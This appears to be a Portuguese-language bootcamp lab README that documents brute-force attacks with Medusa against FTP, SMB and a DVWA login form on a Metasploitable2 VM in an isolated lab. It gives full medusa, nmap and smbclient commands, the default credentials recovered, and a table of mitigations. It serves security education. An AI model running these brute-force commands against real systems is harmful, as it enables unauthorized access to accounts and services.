# 🔐 Brute Force com Medusa — Kali/Parrot vs Metasploitable2

> **Bootcamp:** Riachuelo Cybersecurity — DIO  
> **Desafio:** Ataques de Força Bruta com Medusa em Ambiente Controlado  
> **Ferramentas:** Medusa, Nmap, smbclient, FTP client  
> **Alvo:** Metasploitable2  
> **Atacante:** Parrot OS  

---

## ⚠️ Aviso Legal

Este projeto é realizado **exclusivamente em ambiente de laboratório isolado**, com VMs configuradas para fins educacionais. Executar ataques sem autorização é crime (Lei 12.737/2012 — Brasil). **Nunca utilize estas técnicas fora de ambientes autorizados.**

---

## 🧠 Objetivos de Aprendizagem

- Compreender ataques de força bruta em FTP, Web e SMB
- Utilizar o Medusa para auditoria de segurança em ambiente controlado
- Documentar processos técnicos de forma clara e estruturada
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação
- Utilizar o GitHub como portfólio técnico

---

## 🖥️ Ambiente de Lab

| Máquina | Sistema | Papel | IP |
|---|---|---|---|
| Parrot OS | Parrot 6.x | Atacante | 192.168.56.1 |
| Metasploitable2 | Ubuntu 8.04 LTS | Alvo | 192.168.56.101 |

> Rede: VirtualBox **Host-Only (vboxnet0)** — 192.168.56.0/24

---

## 📁 Estrutura do Repositório

```
lab-smb-brute-force/
├── README.md
├── wordlists/
│   ├── usuarios.txt       # Usuários para FTP e SMB
│   ├── senhas.txt         # Senhas para FTP e SMB
│   ├── web_users.txt      # Usuários para DVWA
│   └── web_senhas.txt     # Senhas para DVWA
├── docs/
│   ├── conceitos.md       # Teoria: brute force, técnicas, mitigações
│   └── ambiente.md        # Configuração do ambiente de lab
├── evidencias/
│   └── LEIA-ME.md         # Checklist de evidências
└── images/                # Screenshots organizados
```

---

## 🔬 Lab 1 — FTP Brute Force (porta 21)

### Objetivo
Descobrir credenciais válidas no serviço FTP do Metasploitable2.

### Verificação do serviço
```bash
nmap -p 21 192.168.56.101
```
**Resultado:**
```
21/tcp open  ftp
```

### Execução do ataque
```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -v 6
```

### Resultado
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do acesso
```bash
ftp 192.168.56.101
# login: msfadmin | senha: msfadmin
```

### Por que FTP é vulnerável?
- Credenciais trafegam em **texto plano** (sem criptografia)
- Sem mecanismo de bloqueio por tentativas excessivas
- Senha padrão nunca alterada

---

## 🔬 Lab 2 — SMB Brute Force (porta 445)

### Objetivo
Descobrir credenciais SMB e acessar compartilhamentos de rede.

### Verificação do serviço
```bash
nmap -p 445 192.168.56.101
```
**Resultado:**
```
445/tcp open  microsoft-ds
```

### Execução do ataque
```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -v 6
```

### Resultado
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

### Validação do acesso
```bash
smbclient -L //192.168.56.101 -U msfadmin%msfadmin
```

**Compartilhamentos acessíveis:**
```
Sharename   Type  Comment
print$      Disk  Printer Drivers
tmp         Disk  oh noes!
opt         Disk
IPC$        IPC   IPC Service
ADMIN$      IPC   Acesso administrativo
msfadmin    Disk  Home Directories
```

---

## 🔬 Lab 3 — DVWA HTTP Brute Force (porta 80)

### Objetivo
Simular ataque de força bruta em formulário web usando o DVWA (Damn Vulnerable Web Application).

### Configuração do DVWA
1. Acessar `http://192.168.56.101/dvwa`
2. Login inicial: `admin:password`
3. DVWA Security → definir nível **Low**

### Execução do ataque
```bash
medusa -h 192.168.56.101 -u admin -P wordlists/senhas.txt -M http \
  -m DIR:/dvwa/login.php \
  -m FORM:username="USER"&password="PASS"&Login=Login \
  -v 6
```

### Resultado
```
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: msfadmin [SUCCESS]
```

### Por que formulários web são vulneráveis sem proteção?
- Sem CAPTCHA ou rate limiting
- Sem bloqueio por IP após tentativas excessivas
- Respostas HTTP diferenciadas expõem falha de login

---

## 📊 Resumo de Resultados

| Lab | Protocolo | Porta | Credencial Encontrada | Tempo |
|---|---|---|---|---|
| Lab 1 | FTP | 21 | msfadmin:msfadmin | ~1 min |
| Lab 2 | SMB | 445 | msfadmin:msfadmin | < 1 seg |
| Lab 3 | HTTP/DVWA | 80 | admin:msfadmin | < 1 seg |

---

## 🛡️ Recomendações de Mitigação

| Prioridade | Medida | Serviços Afetados |
|---|---|---|
| 🔴 CRÍTICO | Alterar todas as senhas padrão imediatamente | FTP, SMB, Web |
| 🔴 CRÍTICO | Implementar Account Lockout (bloqueio após 5 tentativas) | Todos |
| 🟠 ALTO | Desabilitar FTP — substituir por SFTP/SCP | FTP |
| 🟠 ALTO | Desabilitar SMBv1 — vulnerável a EternalBlue | SMB |
| 🟠 ALTO | Implementar MFA em todos os acessos administrativos | Todos |
| 🟡 MÉDIO | CAPTCHA e rate limiting em formulários web | HTTP/Web |
| 🟡 MÉDIO | Monitoramento SIEM com alertas de brute force | Todos |
| 🟢 BAIXO | Auditoria periódica de credenciais fracas | Todos |

---

## 📚 Conceitos Abordados

| Técnica | Descrição |
|---|---|
| **Brute Force** | Testa sistematicamente todas as combinações da wordlist |
| **Password Spraying** | Mesma senha testada contra múltiplos usuários |
| **Credential Stuffing** | Reutilização de credenciais vazadas em outros serviços |
| **Dictionary Attack** | Ataque baseado em wordlist de senhas comuns |

---

## 🛠️ Ferramentas Utilizadas

| Ferramenta | Uso | Instalação |
|---|---|---|
| Medusa v2.3 | Brute force (FTP, SMB, HTTP) | `apt install medusa` |
| Nmap 7.95 | Descoberta e scan de portas | pré-instalado |
| smbclient | Validação acesso SMB | `apt install smbclient` |
| DVWA v1.0.7 | Alvo web vulnerável | incluso no Metasploitable2 |

---

## 👤 Autor

**taissocout**  
[![GitHub](https://img.shields.io/badge/GitHub-taissocout-black?logo=github)](https://github.com/taissocout)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-taissocout-blue?logo=linkedin)](https://linkedin.com/in/taissocout-cybersecurity)

> Desenvolvido como entrega do **Bootcamp Riachuelo Cybersecurity** na plataforma **DIO**.
